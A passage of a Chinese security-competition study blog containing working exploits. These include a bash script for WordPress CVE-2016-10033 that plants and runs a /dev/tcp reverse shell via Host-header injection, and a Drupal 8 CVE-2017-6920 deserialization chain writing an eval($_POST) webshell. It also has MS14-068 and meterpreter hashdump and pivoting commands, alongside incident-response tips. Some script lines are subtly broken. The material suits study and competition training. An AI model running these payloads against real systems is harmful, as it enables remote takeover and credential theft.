| grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    then</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        echo '[-] Connection problens'</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        exit -1</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    fi</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    echo</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    read -p 'RemoteShell&gt; ' cmd</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>done</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>echo '[+] Exiting'</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>#!/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rev_host=\"本机地址\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>function prep_host_header () {</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tcmd = \"$1\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\trce_cmd = \"\\${run {$cmd}}\";</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t# replace /with ${substr {0}{1}{$spool_directory}}</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t# sed's^/^${substr {0}{1}{$spool_directory}}^g'</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\trce_cmd = \"`echo $rce_cmd | sed's^/^\\${substr {0}{1}{\\$exim_path}}^g'`\"</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t# replace ' '(space) with </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    # sed's^ ^${substr {10}{1}{$tod_log}}$^g'</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    rce_cmd = \"`echo $rce_cmd | sed's^ ^\\${substr {10}{1}{\\$tod_log}}^g'`\"</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    # return \"target (any -froot@localhost -be $rce_cmd null)\"</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    host_header=\"a (a -be $rce_cmd p)\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    return 0</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"19\"></td><td><pre># a (a -be ${run {${substr {0}{1}{$exim_path}} usr${substr {0}{1}{$exim_path}} bin${substr {0}{1}{$exim_path}} curl${substr {10}{1}{$tod_log}}-o${substr {0}{1}{$exim_path}} tmp${substr {0}{1}{$exim_path}} r${substr {10}{1}{$tod_log}} 192.168.20.18${substr {0}{1}{$exim_path}} r}} p)</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>if [  \"$=\" -ne 1 ]; then</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>echo -e \"Usage:\\n$0 target-wordpress-url\\n\"</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>exit 1</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>target=\"$1\"</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>echo -ne \"\\e [91m [*]\\033 [0m\"</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>echo -e \"\\e [92m [*]\\033 [0m Guess I can't argue with that... Let's get started...\\n\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre># Server payload/bash script on :80</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>RCE_exec_cmd=\"sleep 3 &amp;&amp; /bin/bash -i &gt;&amp; /dev/tcp/$rev_host/7777 0&gt;&amp;1\"  # r 文件的内容</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>echo \"$RCE_exec_cmd\" &gt; r</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>python -m SimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>hpid=$!</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre># Save payload on the target in /tmp/rce</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>cmd=\"/usr/bin/curl -o/tmp/r $rev_host/r\"  # 将本机的 r 文件写到服务器的 tmp 下的 r 文件</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>prep_host_header \"$cmd\"</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>curl -H\"Host: $host_header\" -s -d 'user_login=galigigi&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>echo -e \"\\n\\e [92m [+]\\e [0m Payload sent successfully\"</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre># Execute payload (RCE_exec_cmd) on the target /bin/bash/tmp/rce</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>cmd=\"/bin/bash/tmp/r\"  # 执行 r 脚本</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prep_host_header \"$cmd\"</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>curl -H\"Host: $host_header\" -d 'user_login=galigigi&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>echo -e \"\\n\\e [92m [+]\\033 [0m Payload executed!\"</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>echo -e \"\\n\\e [92m [*]\\033 [0m Waiting for the target to send us a \\e [94mreverse shell\\e [0m...\\n\"</pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>echo \"Exiting...\"</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>exit 0</pre></td></tr></tbody></table></figure></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"drupal8-rce\"><a class=\"anchor\" href=\"#drupal8-rce\">#</a> Drupal8 RCE</h2>\n<ul>\n<li>\n<p>CVE-2017-6920</p>\n</li>\n<li>\n<p>影响 Drupal8 core 8.3.3</p>\n</li>\n<li>\n<p>yaml 扩展导致的反序列化漏洞</p>\n</li>\n<li>\n<p>需要后台登陆</p>\n</li>\n</ul>\n<p>原理</p>\n<ul>\n<li>\n<p><code>yamlparse()</code>  可以传参数</p>\n</li>\n<li>\n<p>通过 <code>!php/object</code>  来声明一个节点，以 <code>unserialize</code>  方式处理</p>\n</li>\n<li>\n<p>需要安装 yaml 扩展</p>\n</li>\n<li>\n<p>外部可控输入点 ConfigSingleImportForm.php 引入配置</p>\n</li>\n</ul>\n<p>步骤</p>\n<ul>\n<li>寻找可以利用的类</li>\n<li>FileCookieJar.php 写入 webshell</li>\n<li>WindowsPipes.php 任意文件删除</li>\n<li>FnStream.php 无参数函数执行</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">GuzzleHttp<span class=\"token punctuation\">\\</span>Psr7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">FnStream</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$methods</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">methods</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$methods</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// Create the functions on the class</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$methods</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$fn</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token punctuation\">{</span><span class=\"token string single-quoted-string\">'_fn_'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$fn</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_fn_close</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_fn_close</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$fn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FnStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'close'</span><span class=\"token operator\">=&gt;</span><span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>!php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\"</pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.10_1.jpg\" alt=\"\"></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$cookie_jar = new FileCookieJar(\"/var/www/html/drupal8/shell.php\");</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$cookie = array(\"a\" =&gt; \"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>$<span class=\"token string double-quoted-string\">\".\"</span><span class=\"token constant\">_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>\",\"Name\" =&gt; \"123a\", \"Value\" =&gt; '0', \"Domain\" =&gt; 'a', 'Path' =&gt; 'a', 'Expires' =&gt; 123456);</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$ab = new SetCookie($cookie);</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$asb = $cookie_jar-&gt;setCookie($ab);</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>file_put_contents(\"ddd\",addslashes(serialize($cookie_jar)));</pre></td></tr></tbody></table></figure><p>先登录</p>\n<p>漏洞触发点</p>\n<ul>\n<li>/admin/config/development/configuration/single/import</li>\n<li>之后添加 payload 即可</li>\n</ul>\n<h2 id=\"域权限提升漏洞\"><a class=\"anchor\" href=\"#域权限提升漏洞\">#</a> 域权限提升漏洞</h2>\n<ul>\n<li>\n<p>MS14-068</p>\n</li>\n<li>\n<p>通过普通用户用户伪造凭证登录管理员机器</p>\n</li>\n<li>\n<p>需要条件：</p>\n<ul>\n<li>普通域的用户名和密码</li>\n<li>域控的域名</li>\n<li>时间日期同步</li>\n<li>dns 指向域内的 dns 或修改 hosts 文件</li>\n<li><code>apt-get install krb-user</code></li>\n</ul>\n</li>\n<li>\n<p><code>nmap ip -p445 --script=smb-os-discovery</code></p>\n</li>\n<li>\n<p>年月日和时间都需要同步</p>\n<p><code>net time -S &lt;ip&gt;</code>  确认域时间</p>\n<p><code>date -s</code></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2dsb2RlblBhYy5weQ==\">glodenPac.py</span></p>\n<p>-target-ip -dc-ip</p>\n<p><code>domain.com/kaka (用户名):Bomb123 (密码)@&lt;域控主机名 (前面通过 nmap 扫出来的 FQDN)&gt;.domain.com</code></p>\n</li>\n</ul>\n<p>相关链接:</p>\n<ul>\n<li>\n<p>ms14-068</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9kaWdnaW5nLWludG8tbXMxNC0wNjgtZXhwbG9pdGF0aW9uLWFuZC1kZWZlbmNlLw==\">https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vMjAxNC8xMi9tczE0LTA2OC1mdWxsLWNvbXByb21pc2Utc3RlcC1zdGVwLw==\">https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzU2MDgxLmh0bWw=\">http://www.freebuf.com/vuls/56081.html</span></p>\n</li>\n<li>\n<p>Wordpres RCE</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9leHBsb2l0Ym94LmlvL3Z1bG4vV29yZFByZXNzLUV4cGxvaXQtNC02LVJDRS1DT0RFLUVYRUMtQ1ZFLTIwMTYtMTAwMzMuaHRtbA==\">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span></p>\n</li>\n<li>\n<p>Drupal8</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMzNC8/c3BtPTUxNzYxNzc1NTg4NS4yLjI1b0hVNjM=\">https://paper.seebug.org/334/?spm=517617755885.2.25oHU63</span></p>\n</li>\n</ul>\n<h1 id=\"211-真题解析之内网渗透知识及工具使用\"><a class=\"anchor\" href=\"#211-真题解析之内网渗透知识及工具使用\">#</a> 2.11 真题解析之内网渗透知识及工具使用</h1>\n<p>企业赛代理工具和 msf</p>\n<h2 id=\"代理工具\"><a class=\"anchor\" href=\"#代理工具\">#</a> 代理工具</h2>\n<h3 id=\"socks-proxychains-ew-的使用转发\"><a class=\"anchor\" href=\"#socks-proxychains-ew-的使用转发\">#</a> socks、proxychains、ew 的使用转发</h3>\n<p>参考上面 2.8 的内网转发基础</p>\n<h3 id=\"ssh-端口转发\"><a class=\"anchor\" href=\"#ssh-端口转发\">#</a> ssh 端口转发</h3>\n<p>ssh：加密客户端和服务端的通讯数据、突破防火墙的限制</p>\n<h4 id=\"本地端口转发-攻击机上执行\"><a class=\"anchor\" href=\"#本地端口转发-攻击机上执行\">#</a> 本地端口转发 (攻击机上执行)</h4>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -L &lt;本机地址 (可省略)&gt;:&lt; 本机端口 &gt;:&lt; 目标 B 地址 &gt;:&lt; 目标 B 端口 &gt; 跳板 IP (A)</li>\n<li>-N 为不执行命令 -f 为后台执行</li>\n</ul>\n<h3 id=\"远程端口转发-在跳板机-a-上执行\"><a class=\"anchor\" href=\"#远程端口转发-在跳板机-a-上执行\">#</a> 远程端口转发 (在跳板机 A 上执行)</h3>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -R &lt;攻击机 IP&gt;:&lt; 攻击机端口 &gt;:&lt; 目标 B 地址 &gt;:&lt; 目标 B 端口 &gt; 攻击机 IP</li>\n</ul>\n<ul>\n<li>适用于防火墙情况不能从攻击机直接连接 A，但是 A 可以回连</li>\n</ul>\n<h3 id=\"动态端口转发-在攻击机上执行\"><a class=\"anchor\" href=\"#动态端口转发-在攻击机上执行\">#</a> 动态端口转发 (在攻击机上执行)</h3>\n<p>Hacker = &gt; A = &gt; B</p>\n<ul>\n<li>ssh -Nf -D &lt;攻击机 IP&gt;:&lt; 攻击机端口 &gt; &lt; 跳板机 A 的 IP 地址 &gt;</li>\n</ul>\n<ul>\n<li>不需要制定目标的端口和 IP 获得完全的访问</li>\n</ul>\n<h3 id=\"web-端代理工具\"><a class=\"anchor\" href=\"#web-端代理工具\">#</a> web 端代理工具</h3>\n<h4 id=\"regeorg-2\"><a class=\"anchor\" href=\"#regeorg-2\">#</a> reGeorg</h4>\n<p>见 2.8</p>\n<h3 id=\"windows-端代理工具\"><a class=\"anchor\" href=\"#windows-端代理工具\">#</a> windows 端代理工具</h3>\n<h4 id=\"proxifier\"><a class=\"anchor\" href=\"#proxifier\">#</a> Proxifier</h4>\n<h4 id=\"cknife\"><a class=\"anchor\" href=\"#cknife\">#</a> Cknife</h4>\n<h2 id=\"merasploit\"><a class=\"anchor\" href=\"#merasploit\">#</a> Merasploit</h2>\n<ul>\n<li>集成渗透测试框架</li>\n<li>meterpreter\n<ul>\n<li>migrate 迁移进程</li>\n<li>hashdump 收集用户 hash</li>\n<li>ipconfig 查询网卡信息</li>\n<li>run getgui -e 开启 33889 远程桌面端口</li>\n<li>run autoroute -s 网段 添加后，可以将代理架设出来\n<ul>\n<li>use auxiliary/server/socks_proxy 默认监听本地的 1080 端口 (使用的是 socks5)</li>\n<li>使用 run 之后，代理便架设了，然后使用 proxychains 就可以使用</li>\n</ul>\n</li>\n<li>内网扫描\n<ul>\n<li>use auxiliary/scanner/portscan/tcp</li>\n</ul>\n</li>\n<li>端口转发\n<ul>\n<li>portfwd add -l 7777 -p 80 (目标机) -r ip (目标机)</li>\n</ul>\n</li>\n<li>使用代理\n<ul>\n<li>set proxies socks5: 代理的 IP</li>\n<li>设置代理之后不能设置 reverse 类型的 payload，可以设置 set payload windows/x64/meterpreter/bind_tcp</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"212-铁三-数据分析赛\"><a class=\"anchor\" href=\"#212-铁三-数据分析赛\">#</a> 2.12 铁三 - 数据分析赛</h1>\n<p>可能题目：</p>\n<ul>\n<li>\n<p>路由器或交换机的品牌或型号</p>\n</li>\n<li>\n<p>攻击方法</p>\n</li>\n<li>\n<p>时间</p>\n</li>\n<li>\n<p>执行的第 x 条命令</p>\n</li>\n<li>\n<p>爆破的次数</p>\n</li>\n<li>\n<p>敏感文件名称</p>\n</li>\n<li>\n<p>各种账号密码或密码哈希</p>\n</li>\n</ul>\n<p>相关题目的解法</p>\n<ul>\n<li>\n<p>登陆相关：admin、login、manage</p>\n</li>\n<li>\n<p>文件相关：edit、upload、modify</p>\n</li>\n<li>\n<p>用来过滤（匹配）url 中的多个关键字</p>\n<p>http.request url matches \"admin | login\"(正则表达式)</p>\n</li>\n</ul>\n<p>技巧：</p>\n<ul>\n<li>定位 ctrl+m 对数据记录进行标记，ctrl+shift+n 下一条，ctrl+shift+b 上一条</li>\n</ul>\n<h2 id=\"应急响应解析\"><a class=\"anchor\" href=\"#应急响应解析\">#</a> 应急响应解析</h2>\n<h3 id=\"准备阶段\"><a class=\"anchor\" href=\"#准备阶段\">#</a> 准备阶段</h3>\n<h4 id=\"完善监控体系\"><a class=\"anchor\" href=\"#完善监控体系\">#</a> 完善监控体系</h4>\n<p>在部署服务器时，要由系统维护人员尽可能的使用自动化脚本、监控软件对网络流量、系统资源使用率、安全事件日志实现自动统计和告警呈现。</p>\n<p>使用方法：将脚本放到 <code>crontab</code>  计划任务中，每小时自动执行。这样便会在 <code>/home/oslog/host_yyymmdd/hh</code>  目录下生成各个小时的 cpu、内存、网络、I0 的统计数据。</p>\n<h4 id=\"其他措施\"><a class=\"anchor\" href=\"#其他措施\">#</a> 其他措施</h4>\n<ol>\n<li>\n<p>制定安全预案</p>\n<p>以业务为核心，针对可能发生的安全事件之前、发生过程中以及刚刚结束之后，谁负责做什么、何时做</p>\n</li>\n<li>\n<p>安全应急演练</p>\n<p>定期进行安全演练，熟悉应急过程、防止因突发安全事件而措手不及</p>\n</li>\n<li>\n<p>建立安全初始化快照</p>\n<p>定期给服务器创建快照，防止因安全事件导致服务器重要数据丢失</p>\n</li>\n<li>\n<p>准备响应工具包</p>\n<p>再出现安全事故时不要相信服务器上的任何命令文件。无论是安全应急的检测阶段还是安全应急的根治阶段，你都需要一个响应工具包</p>\n</li>\n</ol>\n<h4 id=\"windows-响应工具包\"><a class=\"anchor\" href=\"#windows-响应工具包\">#</a> Windows 响应工具包</h4>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_1.jpg\" alt=\"\"></p>\n<h4 id=\"linux-响应工具包\"><a class=\"anchor\" href=\"#linux-响应工具包\">#</a> Linux 响应工具包</h4>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_2.jpg\" alt=\"\"></p>\n<p><strong>Linux 常见进程</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_3.jpg\" alt=\"\"></p>\n<h3 id=\"检测阶段\"><a class=\"anchor\" href=\"#检测阶段\">#</a> 检测阶段</h3>\n<ul>\n<li>\n<p>通过异常文件的创建和修改时间，一般可以判断攻击者对网站进行入侵的时间段；</p>\n</li>\n<li>\n<p>对异常服务或进程的追踪，可以查找恶意文件，确认攻击后的后门，以及攻击时间；</p>\n</li>\n<li>\n<p>网站目录下的异常文件，对判断攻击手段具有参考意义；</p>\n</li>\n<li>\n<p>网站访问日志可以对攻击手段、时间和攻击源地址的追踪提供有力的证据。</p>\n</li>\n<li>\n<p>系统安全日志中的登录信息同样可以用于判断攻击者来源。</p>\n</li>\n</ul>\n<p><strong>Linux 检查点</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_4.jpg\" alt=\"\"></p>\n<p><strong>Linxu 应急命令</strong></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.12_5.jpg\" alt=\"\"></p>\n<p>其中查找 s 权限位的命令应为 <code>find / -type f -perm -04000</code></p>\n<p><strong>Linxu 使用应急命令</strong></p>\n<ul>\n<li>\n<p>在 apachelog 中找出访问次数最多的 10 个 IP。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'{print $1}'</span> apache_ log <span class=\"token operator\">|</span><span class=\"token function\">sort</span> <span class=\"token operator\">|</span><span class=\"token function\">uniq</span> -c<span class=\"token operator\">|</span><span class=\"token function\">sort</span> -nr<span class=\"token operator\">|</span><span class=\"token function\">head</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">10</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>在 apache 日志中找出访问次数最多的几个分钟。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'{print $4}'</span> access_ log <span class=\"token operator\">|</span><span class=\"token function\">cut</span> <span class=\"token parameter variable\">-C</span> <span class=\"token number\">14</span>-18<span class=\"token operator\">|</span><span class=\"token function\">sort</span><span class=\"token operator\">|</span><span class=\"token function\">uniq</span> -c<span class=\"token operator\">|</span><span class=\"token function\">sort</span> -nr<span class=\"token operator\">|</span><span class=\"token function\">head</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>假设我们定位到某个可疑 ip 访问次数较多，那么我们可以从系统日志中进行查询该 ip 的具体行为:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> access_ _log <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token number\">220.181</span>.38.183 <span class=\"token operator\">|</span> <span class=\"token function\">less</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>假设发现问题文件，但不允许被删除:</p>\n<p>先使用 <code>lsattr</code>  查看文件属性 (i)， 去掉 i 属性 <code>chattr -i filename</code></p>\n</li>\n</ul>\n<h3 id=\"抑制根除阶段\"><a class=\"anchor\" href=\"#抑制根除阶段\">#</a> 抑制根除阶段</h3>\n<h3 id=\"恢复阶段\"><a class=\"anchor\" href=\"#恢复阶段\">#</a> 恢复阶段</h3>\n<h3 id=\"跟进阶段\"><a class=\"anchor\" href=\"#跟进阶段\">#</a> 跟进阶段</h3>\n<h1 id=\"214-真题解析之缓冲区溢出基础及样题解析\"><a class=\"anchor\" href=\"#214-真题解析之缓冲区溢出基础及样题解析\">#</a> 2.14 真题解析之缓冲区溢出基础及样题解析</h1>\n<h2 id=\"环境准备\"><a class=\"anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<ul>\n<li>\n<p>Ubuntu 16.04 64bit</p>\n</li>\n<li>\n<p>sudo apt-get install binutils nasm nmap gcc</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L0FJUzMtMjAxNy9ibG9iL21hc3Rlci9lbnZfc2V0dXAuc2g=\">https://github.com/scwuaptx/AIS3-2017/blob/master/env_setup.sh</span></p>\n</li>\n<li>\n<p>sudo echo \"set disassembly-flavor intel\"&gt; ~/.gdbinit</p>\n</li>\n</ul>\n<h2 id=\"相关知识\"><a class=\"anchor\" href=\"#相关知识\">#</a> 相关知识</h2>\n<ul>\n<li>\n<p>汇编、C、python</p>\n</li>\n<li>\n<p>Linux、gdb、gcc、objdump、IDApro</p>\n</li>\n<li>\n<p>听说过 shellcode、stack overflow 、NX、ROP、pwntools</p>\n</li>\n</ul>\n<h2 id=\"pwn-简介\"><a class=\"anchor\" href=\"#pwn-简介\">#</a> Pwn 简介</h2>\n<h3 id=\"产生漏洞原因\"><a class=\"anchor\" href=\"#产生漏洞原因\">#</a> 产生漏洞原因：</h3>\n<ul>\n<li>\n<p>CPU 和内存之间交换数据和指令</p>\n</li>\n<li>\n<p>数据和指令之间并不能完全的区分开来</p>\n</li>\n</ul>\n<h3 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h3>\n<p>漏洞 --&gt; 控制流劫持</p>\n<ul>\n<li>\n<p>利用漏洞达成攻击者的目的</p>\n</li>\n<li>\n<p>主要取得程序的控制权</p>\n</li>\n<li>\n<p>又称 PWN</p>\n</li>\n</ul>\n<h3 id=\"常用工具\"><a class=\"anchor\" href=\"#常用工具\">#</a> 